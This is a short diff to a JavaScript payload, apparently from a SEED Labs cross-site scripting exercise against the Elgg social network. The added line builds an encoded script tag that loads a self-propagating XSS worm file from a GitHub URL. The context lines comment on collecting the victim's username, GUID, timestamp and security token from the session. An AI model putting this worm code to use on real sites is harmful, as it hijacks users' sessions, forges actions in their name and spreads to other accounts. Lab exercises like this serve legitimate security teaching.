@@ -1,4 +1,5 @@
 window.onload = function () {
+    var wormCode = encodeURIComponent("<script type=\"text/javascript\"" + "src=\"https://github.com/li-xin-yi/seedlab/raw/master/Cross-Site-Scripting-Attack/xssworm.js\">" + "</" + "script>");
     //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
     //and Security Token __elgg_token
     var userName = "&name=" + elgg.session.user.name;
